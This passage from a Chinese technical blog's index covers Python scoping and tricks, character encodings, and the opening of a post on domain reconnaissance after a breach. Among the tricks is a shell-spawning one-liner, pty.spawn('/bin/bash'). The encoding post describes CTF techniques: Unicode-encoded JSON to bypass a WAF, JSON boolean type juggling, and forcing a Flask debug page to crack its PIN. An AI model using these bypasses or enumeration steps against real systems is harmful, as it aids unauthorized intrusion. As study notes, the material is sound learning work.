class="line"><span class="keyword">def</span> <span class="title function_">test2</span>():</span><br><span class="line"><span class="keyword">global</span> x</span><br><span class="line">x=<span class="number">10</span></span><br><span class="line">test2()</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808141136207-1687707604253.png" alt="image-20220808141136207"></p><p><img src="/../images/image-20220808141228174-1687707604253.png" alt="image-20220808141228174"></p><p>nonlocal用于寻找同为local空间的变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nonlocal means, not in the current function&#x27;s local scope and neither in the global scope</span><br><span class="line">nonlocal的寻找范围：上一级local空间到global空间的下一级</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808141525359-1687707604253.png" alt="image-20220808141525359"></p><p><img src="/../images/image-20220808141538079-1687707604253.png" alt="image-20220808141538079"></p><p>虽然global中声明了变量a，但是nonlocal还是找不到变量a</p><p><img src="/../images/image-20220808141845300-1687707604253.png" alt="image-20220808141845300"></p><p><img src="/../images/image-20220808141538079-1687707604253.png" alt="image-20220808141538079"></p><p>即使在local中声明了<code>global a</code>,nonlocal仍然找不到变量a</p><p>所以nonlocal的寻找范围：上一级local空间到global空间的下一级</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python技巧</title>
      <link href="/2023/05/01/python%E6%8A%80%E5%B7%A7/"/>
      <url>/2023/05/01/python%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h3 id="输出列表元素"><a href="#输出列表元素" class="headerlink" title="输出列表元素"></a>输出列表元素</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lis=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(lis[<span class="number">1</span>:])</span><br><span class="line"><span class="built_in">print</span>(*lis[<span class="number">1</span>:])</span><br><span class="line">&gt;&gt;</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="同时获得元素与元素索引"><a href="#同时获得元素与元素索引" class="headerlink" title="同时获得元素与元素索引"></a>同时获得元素与元素索引</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lis = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(lis):</span><br><span class="line"><span class="built_in">print</span>(index,i)</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="number">0</span> a</span><br><span class="line"><span class="number">1</span> b</span><br><span class="line"><span class="number">2</span> c</span><br></pre></td></tr></table></figure><h3 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h3><ul><li><p>类似c语言</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># %s 字符串占位</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s&quot;</span>%<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line"><span class="comment"># %c 字符占位</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%c&quot;</span>%<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>format   (会自动将变量转为str)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">a=<span class="number">1</span></span><br><span class="line">b=<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure><blockquote><p>占位符格式化<a href="https://blog.csdn.net/u014770372/article/details/76021988">https://blog.csdn.net/u014770372/article/details/76021988</a></p></blockquote></li></ul><h3 id="交换数值"><a href="#交换数值" class="headerlink" title="交换数值"></a>交换数值</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">1</span></span><br><span class="line">b=<span class="number">2</span></span><br><span class="line">a,b=b,a</span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line">&gt;&gt;<span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="推导式"><a href="#推导式" class="headerlink" title="推导式"></a>推导式</h3><blockquote><p>[想得到的变量形式 for 变量 in 可迭代对象 if 条件表达式]</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#找出列表里大于0的数</span></span><br><span class="line">shu=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,-<span class="number">1</span>,-<span class="number">2</span>,-<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> shu <span class="keyword">if</span> i&gt;<span class="number">0</span>])</span><br><span class="line">&gt;&gt;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#统计一个字符串中每个字符出现的次数</span></span><br><span class="line">m = <span class="string">&#x27;I am Khazking!&#x27;</span></span><br><span class="line">n = &#123;i:m.count(i) <span class="keyword">for</span> i <span class="keyword">in</span> m&#125;</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">&gt;&gt;&#123;<span class="string">&#x27;I&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27; &#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;m&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;K&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;h&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;k&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;i&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;n&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;g&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;!&#x27;</span>: <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串替换"><a href="#字符串替换" class="headerlink" title="字符串替换"></a>字符串替换</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#repalce方法只能实现元素一对一替换</span></span><br><span class="line"><span class="comment">#使用下述方法可以实现b替换为z,z替换为b</span></span><br><span class="line"><span class="comment">#建立映射关系字典</span></span><br><span class="line">a=<span class="string">&#x27;zbbz&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;&#x27;</span>.maketrans(<span class="string">&#x27;bz&#x27;</span>,<span class="string">&#x27;zb&#x27;</span>)<span class="comment">#等价于 table= &#123;&#x27;b&#x27;:&#x27;z&#x27;,&#x27;z&#x27;:&#x27;b&#x27;&#125;</span></span><br><span class="line">a = a.translate(table)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt;bzzb</span><br></pre></td></tr></table></figure><h3 id="各种排序"><a href="#各种排序" class="headerlink" title="各种排序"></a>各种排序</h3><p><code>reverse=True</code>降序，默认为升序</p><ul><li><p>字典排序</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 按键值排序</span></span><br><span class="line"><span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 按键名排序</span></span><br><span class="line"><span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">0</span>],reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li><li><p>嵌套排序</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字典嵌套</span></span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: [<span class="number">1</span>, <span class="number">3</span>], <span class="string">&#x27;c&#x27;</span>: [<span class="number">3</span>, <span class="number">4</span>], <span class="string">&#x27;b&#x27;</span>: [<span class="number">0</span>, <span class="number">2</span>], <span class="string">&#x27;d&#x27;</span>: [<span class="number">2</span>, <span class="number">1</span>]&#125;</span><br><span class="line"><span class="built_in">sorted</span>(dic.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>][<span class="number">1</span>], reverse=<span class="literal">True</span>) <span class="comment"># 按键值（列表）的第二个元素排列</span></span><br><span class="line"><span class="comment"># 列表嵌套</span></span><br><span class="line">[[<span class="string">&#x27;金牛&#x27;</span>, <span class="number">89000</span>, <span class="number">13140.196950444726</span>, <span class="number">2800</span>, <span class="number">1574</span>], [<span class="string">&#x27;锦江&#x27;</span>, <span class="number">113800</span>, <span class="number">18719.342387419587</span>, <span class="number">2550</span>, <span class="number">1399</span>], [<span class="string">&#x27;成华&#x27;</span>, <span class="number">96400</span>, <span class="number">14034.861538461539</span>, <span class="number">2300</span>, <span class="number">1300</span>], [<span class="string">&#x27;高新&#x27;</span>, <span class="number">160000</span>, </span><br><span class="line"><span class="number">23663.31254871395</span>, <span class="number">3600</span>, <span class="number">1283</span>], [<span class="string">&#x27;武侯&#x27;</span>, <span class="number">102000</span>, <span class="number">19768.739789964995</span>, <span class="number">3100</span>, <span class="number">857</span>]]</span><br><span class="line"><span class="built_in">sorted</span>(lis, key = <span class="keyword">lambda</span> k : k[<span class="number">2</span>],reverse= <span class="literal">True</span>) <span class="comment"># 按每个子列表的第三个元素排列</span></span><br></pre></td></tr></table></figure></li></ul><p>修改下标即可按照其他元素进行排列。</p><h3 id="统计字符出现的频率"><a href="#统计字符出现的频率" class="headerlink" title="统计字符出现的频率"></a>统计字符出现的频率</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">data = [randint(<span class="number">0</span>,<span class="number">20</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>)]</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">dict</span>.fromkeys(data,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    s[i]+=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 统计字符出现次数</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#统计s中出现频率最高的三个数</span></span><br><span class="line"><span class="built_in">print</span> (Counter(s).most_common(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><h3 id="从序列中筛选出符合条件的元素"><a href="#从序列中筛选出符合条件的元素" class="headerlink" title="从序列中筛选出符合条件的元素"></a>从序列中筛选出符合条件的元素</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="comment">#filter(function, iterable)</span></span><br><span class="line">data = [randint(-<span class="number">10</span>,<span class="number">10</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:x&gt;=<span class="number">0</span>,data))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者列表推导式</span></span><br></pre></td></tr></table></figure><h3 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h3><blockquote><p>我们采集数据进行分析，但是我们只需要保存结果，我们采集的数据如果常驻内存就会让电脑崩溃，于是我们将这个数据放在临时文件中（外部存储），在文件关闭后将被删除</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tempfile <span class="keyword">import</span> TemporaryFile,NamedTemporaryFile</span><br><span class="line">f = TemporaryFile()</span><br><span class="line">f.write(<span class="string">b&#x27;abc&#x27;</span>*<span class="number">10000</span>)</span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line">a=f.read(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><blockquote><p>这个临时文件在系统中是找不到的，如果我们想创建一个能在文件系统中看到的临时文件，我们就用NamedTemporaryFile</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nte = NamedTemporaryFile(delete=false)<span class="comment">#delete参数为false时程序运行完，临时文件也不会被删除</span></span><br><span class="line"><span class="built_in">print</span>(nte.name)</span><br></pre></td></tr></table></figure><h3 id="穷举组合"><a href="#穷举组合" class="headerlink" title="穷举组合"></a>穷举组合</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#全排列  </span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="comment">#permutations()返回的是tuple类型，所要要用&#x27;&#x27;.join(i)连接起来</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> permutations(<span class="string">&#x27;123&#x27;</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(i),end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="模拟终端"><a href="#模拟终端" class="headerlink" title="模拟终端"></a>模拟终端</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pty;pty.spawn(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="二进制文件原地修改"><a href="#二进制文件原地修改" class="headerlink" title="二进制文件原地修改"></a>二进制文件原地修改</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> mmap</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">memory_map</span>(<span class="params">filename, access=mmap.ACCESS_WRITE</span>):</span><br><span class="line">    size = os.path.getsize(filename)</span><br><span class="line">    fd = os.<span class="built_in">open</span>(filename, os.O_RDWR)</span><br><span class="line">    <span class="keyword">return</span> mmap.mmap(fd, size, access=access)</span><br><span class="line">m = memory_map(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(m)</span><br><span class="line"><span class="number">1000000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line"><span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="脚本参数"><a href="#脚本参数" class="headerlink" title="脚本参数"></a>脚本参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python xx.py aa</span><br><span class="line"></span><br><span class="line">sys.argv[<span class="number">0</span>]→xx.py</span><br><span class="line">sys.argv[<span class="number">1</span>]→aa</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-u&quot;</span>,<span class="string">&quot;--url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;target url&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--threads&quot;</span> , <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;threads num&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">&gt;&gt;</span><br><span class="line">python xx.py -u xx.com -t <span class="number">20</span></span><br><span class="line"></span><br><span class="line">args.url=xx.com</span><br><span class="line">args.threads=<span class="number">20</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>编码</title>
      <link href="/2023/05/01/%E7%BC%96%E7%A0%81/"/>
      <url>/2023/05/01/%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="编码的由来"><a href="#编码的由来" class="headerlink" title="编码的由来"></a>编码的由来</h2><p>计算机存储的任何数据，包括各种文本、图片、音视频文件等等，实际上都是一串<a href="https://so.csdn.net/so/search?q=%E4%BA%8C%E8%BF%9B%E5%88%B6&spm=1001.2101.3001.7020">二进制</a>数字01字节序列组成的。</p><p>字节一般用来存储与网络传输，这样可以节省存储空间与网络传输带宽。而字符主要是用于显示，方便大家阅读。</p><p>编码主要是为了存储传输，而解码是为了方便阅读</p><h2 id="编码方式的确立"><a href="#编码方式的确立" class="headerlink" title="编码方式的确立"></a>编码方式的确立</h2><p>可以通过http消息头的accept-encoding指定</p><p>html中的charset&#x3D;”UTF-8″</p><p>应用本身的编码方式</p><h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><p>编码表</p><blockquote><p>大小写字母，[0,9]，+，&#x2F;</p></blockquote><p>加密</p><blockquote><p>每6个字符为一组</p></blockquote><p>解密</p><blockquote><p>每8个字符为一组</p></blockquote><p>加密时不足的会补上<code>=</code></p><h2 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h2><p>明&#x2F;密文空间：字母表</p><p>操作：右移13位</p><p>可逆运算</p><h2 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h2><p><a href="https://blog.csdn.net/freeking101/article/details/68922983">URL原理、URL编码、URL特殊字符</a></p><h4 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h4><p><a href="https://www.cnblogs.com/zuge/p/6141359.html">URL中的保留和不安全字符 - atzuge - 博客园</a></p><p><img src="/../images/image-20220204213349476.png" alt="image-20220204213349476"></p><h4 id="在哪里发生"><a href="#在哪里发生" class="headerlink" title="在哪里发生"></a>在哪里发生</h4><p>当我们向服务器发送数据时，浏览器就会自动将需要编码的字符进行URL编码（可以在数据包中看到）,然后服务器接收到数据包后，也会自动解码URL编码后的字符。</p><h2 id="Ascii"><a href="#Ascii" class="headerlink" title="Ascii"></a>Ascii</h2><p>长度：固定1字节</p><p>0~126个字符，其中前32个字符为不可打印字符</p><h2 id="Unicode字符集–万国码"><a href="#Unicode字符集–万国码" class="headerlink" title="Unicode字符集–万国码"></a>Unicode字符集–万国码</h2><p>形式：U+数字  或者 16进制形式\u8fd9\u662f\u4e00</p><p>长度：固定<strong>2字节</strong></p><p><a href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a></p><p><img src="/../images/image-20220624223033281.png" alt="image-20220624223033281"></p><h3 id="UTF"><a href="#UTF" class="headerlink" title="UTF"></a>UTF</h3><p>UTF是Unicode Transformation Format(统一码转换格式)，变长Unicode编码。</p><p>常见的有UTF-8,UTF-16,UTF-32</p><h2 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h2><p><a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a></p><p><a href="https://blog.csdn.net/qq_36539075/article/details/79946099">https://blog.csdn.net/qq_36539075/article/details/79946099</a></p><h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><p>&amp;#36825</p><h2 id="编码安全"><a href="#编码安全" class="headerlink" title="编码安全"></a>编码安全</h2><h3 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h3><p><a href="https://forum.butian.net/share/639">奇安信攻防社区-从RFC看如何使用Base64编码绕过WAF</a></p><h3 id="编码前后不一致"><a href="#编码前后不一致" class="headerlink" title="编码前后不一致"></a>编码前后不一致</h3><ul><li><p>SQL宽字节注入</p></li><li><p>文件编码不同，导致报错</p><p>[NSSRound#6 Team]check(Revenge)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.islink(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">oct</span>(os.stat(filepath).st_mode)[-<span class="number">3</span>:] != <span class="string">&#x27;444&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br></pre></td></tr></table></figure><p><code>with open(filepath, &#39;r&#39;) as f</code>，这里mode为r，默认为utf-8编码。</p><p>所以当我们将gbk编码的文件上传后，读取时就会报错，从而出现debug界面</p><p><img src="/../images/image-20221021205739631.png" alt="image-20221021205739631"></p><p>这时候就可以尝试进行Flask的PIN码破解</p></li></ul><h3 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h3><blockquote><p>原理简单来说就是对字符串的标准化操作导致unicode字符转换成了与他同形的ascii字符。</p></blockquote><p><a href="https://1idb.com/?p=642">Web 基于ASIS 2019：Unicorn shop学习Unicode安全隐患 – 大彪的小站</a></p><p>查询：</p><p><a href="https://unicode-table.com/cn/blocks/">https://unicode-table.com/cn/blocks/</a></p><p><a href="https://unicode-table.com/cn/sets/symbols-for-nickname/#arabic-and-roman-numerals">https://unicode-table.com/cn/sets/symbols-for-nickname/#arabic-and-roman-numerals</a></p><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p><a href="https://www.w3cschool.cn/json/28yd1mw2.html">json编码</a></p><blockquote><p>字符串支持unicode编码</p></blockquote><p><img src="/../images/image-20220725194348092.png"></p><h4 id="过滤位置出错"><a href="#过滤位置出错" class="headerlink" title="过滤位置出错"></a>过滤位置出错</h4><p>后端接收JSON数据，没有先对其进行解码等处理，而直接对其进行操作如判断，过滤</p><ul><li><p>过滤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    xxxx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">waf</span>(<span class="variable">$body</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><blockquote><p>对于这种情况，只需要对提交的JSON数据进行UNICODE编码即可绕过waf。</p></blockquote></li><li><p>判断比较</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$numbers</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>); <span class="comment">#获取ajax请求的数据</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;           </span><br></pre></td></tr></table></figure><blockquote><p>将$numbers的每一位与待比较数字逐字比较</p><p>因为json支持数组和布尔类型的数据，所以可以构造json数据为{numbers:[true,true,true,true,true,true,true]}</p><p>只要待比较数字$win_numbers的每一位都大于0，即可输出flag</p></blockquote></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.w3school.com.cn/charsets/index.asp">HTML字符集 (w3school.com.cn)</a></p><p><a href="https://cloud.tencent.com/developer/article/1748394">30余种加密编码类型的密文特征分析（建议收藏） - 云+社区 - 腾讯云 (tencent.com)</a></p><p><a href="https://segmentfault.com/a/1190000019437999">python中的编码</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>后渗透之内网信息收集</title>
      <link href="/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230320152802672-1693107475017.png" alt="image-20230320152802672"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">systeminfo | findstr 域</span><br><span class="line">systeminfo | findstr Domain</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230320152858151-1693107475019.png" alt="image-20230320152858151"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net config workstation | findstr 域</span><br><span class="line">net config workstation | findstr Domain</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230320153121788-1693107475019.png" alt="image-20230320153121788"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><ul><li>存在域，但当前用户不是域用户</li></ul><p><img src="/../images/6-1694794044688.png" alt="6"></p><ul><li><p>存在域，且当前用户是域用户</p><p><img src="/../images/5-1694794093177.png" alt="5"></p></li><li><p>当前网络环境为工作组，提示不存在域</p><p><img src="/../images/7-1694794120868.png" alt="7"></p></li></ul><h1 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h1><h1 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h1><ul><li><p>Fscan</p></li><li><p>ARP-SCAN</p></li><li><p>ping命令</p></li></ul><h1 id="探测存活主机端口"><a href="#探测存活主机端口" class="headerlink" title="探测存活主机端口"></a>探测存活主机端口</h1><ul><li>Fscan</li><li>Telnet </li><li>nc</li></ul><h1 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h1>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>后渗透之基础知识</title>
      <link href="/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
